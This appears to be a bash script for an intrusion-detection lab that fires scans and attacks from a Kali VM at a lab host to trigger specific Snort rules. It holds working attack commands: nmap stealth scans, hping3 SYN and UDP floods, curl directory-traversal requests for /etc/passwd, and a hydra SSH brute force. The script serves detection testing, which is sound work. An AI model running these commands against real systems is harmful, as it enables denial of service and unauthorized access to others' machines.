#!/bin/bash
# ============================================================
# attack_simulation.sh  -  run on the ATTACKER VM (Kali)
# FOR YOUR OWN ISOLATED LAB ONLY. Never run against systems
# you do not own or have written permission to test.
# Usage: chmod +x attack_simulation.sh && ./attack_simulation.sh 192.168.56.20
# ============================================================

TARGET="${1:-192.168.56.20}"
echo "[*] Target: $TARGET"
pause() { echo; read -p "[?] Check Snort alerts, then press ENTER for next test..." ; }

echo "[1] ICMP ping"
ping -c 4 "$TARGET"
pause

echo "[2] Nmap SYN scan (rule sid 1000002)"
sudo nmap -sS -p 1-1000 "$TARGET"
pause

echo "[3] Nmap NULL scan (sid 1000004)"
sudo nmap -sN -p 1-200 "$TARGET"
pause

echo "[4] Nmap FIN scan (sid 1000005)"
sudo nmap -sF -p 1-200 "$TARGET"
pause

echo "[5] Nmap XMAS scan (sid 1000006)"
sudo nmap -sX -p 1-200 "$TARGET"
pause

echo "[6] Nmap service/version + NSE http scripts (sid 1000011)"
sudo nmap -sV -p 80 --script http-title,http-headers "$TARGET"
pause

echo "[7] SYN flood for 5 seconds (sid 1000003)"
sudo timeout 5 hping3 -S --flood -p 80 "$TARGET"
pause

echo "[8] UDP flood for 5 seconds (sid 1000010)"
sudo timeout 5 hping3 --udp --flood -p 53 "$TARGET"
pause

echo "[9] HTTP directory traversal (sid 1000008, 1000009)"
curl -s "http://$TARGET/../../../../etc/passwd" -o /dev/null
curl -s "http://$TARGET/index.php?file=../../../../etc/passwd" -o /dev/null
pause

echo "[10] SSH brute force, small wordlist (sid 1000007)"
printf "admin\nroot\ntest\n123456\npassword\nqwerty\n" > /tmp/small_pass.txt
hydra -l root -P /tmp/small_pass.txt -t 4 ssh://"$TARGET"
pause

echo "[11] FTP login attempt (sid 1000012)"
printf "USER anonymous\r\nPASS test@test.com\r\nQUIT\r\n" | nc -w 3 "$TARGET" 21

echo "[*] Done. Now analyse alerts on the Snort VM."
